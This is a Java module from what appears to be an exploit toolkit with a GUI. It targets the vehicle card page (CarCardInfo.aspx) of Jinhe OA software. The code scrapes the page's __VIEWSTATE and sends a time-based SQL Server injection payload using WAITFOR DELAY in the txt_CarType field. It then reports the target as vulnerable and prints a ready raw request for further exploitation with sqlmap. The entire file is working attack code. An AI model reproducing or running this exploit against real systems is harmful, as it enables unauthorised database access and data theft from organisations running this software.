package exp.oa.jinheoa;

import core.Exploitlnterface;
import decrypt.code.getAllEncode;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.*;

import java.util.HashMap;

public class jinhe_CarCardInfo_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，请利用sqlmap进行测试");
        });
        return null;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            Response res = HttpTools.get(url + "/c6/JHSoft.Web.Vehicle/CarCardInfo.aspx/", head, "utf-8");
            String var1 = res.getText();
            int var2 = getIndexOf.getLineNumber(var1,"name=\"__VIEWSTATE\" id=\"__VIEWSTATE\"");
            String var3 = getIndexOf.getMessage_useLine(var1,var2,var2);
            String var4 = var3.substring(var3.indexOf("value=\"")+7,var3.indexOf("\" />"));
            String var5 = getAllEncode.getAllUrlEncode(var4,"");
            String data = "_ListPage1LockNumber=1&_ListPage1RecordCount=0&__VIEWSTATE="+var5+"&txt_CarType=1') WAITFOR DELAY '0:0:2'-- tcNA&txt_CarCode=&bt_Search=%B2%E9%D1%AF&__VIEWSTATEGENERATOR=5A747BED&__EVENTTARGET=&__EVENTARGUMENT=";
            long var = HttpTools_getTime.post(url + "/c6/JHSoft.Web.Vehicle/CarCardInfo.aspx/" ,data, head, "utf-8");
            if ( var > 2000) {
                String target_req = "POST /c6/JHSoft.Web.Vehicle/CarCardInfo.aspx/ HTTP/1.1\n" +
                        "Host: "+ url.substring(url.indexOf("://")+3)+"\n" +
                        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36\n" +
                        "Content-Length: 50\n" +
                        "Cache-Control: max-age=0\n" +
                        "Connection: close\n" +
                        "Content-Type: application/x-www-form-urlencoded\n" +
                        "Sec-Ch-Ua: \"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"\n" +
                        "Upgrade-Insecure-Requests: 1\n" +
                        "Accept-Encoding: gzip, deflate\n" +
                        "\n" +
                        data;
                Platform.runLater(() -> {
                    textArea.appendText("\n [ jinhe_CarCardInfo_sqli ]");
                    textArea.appendText("\n 利用sqlmap模块进行注入,注入类型:延时注入,sql:sqlserver");
                    textArea.appendText("\n");
                });
                Platform.runLater(() -> {
                    textArea_cmd.appendText("\n----------------------------------------------------------------------\n"+
                            "\npayload:\n"+target_req +
                            "\n----------------------------------------------------------------------\n"+
                            "\n延时时间: "+var+"毫秒\n----------------------------------------------------------------------\n");
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
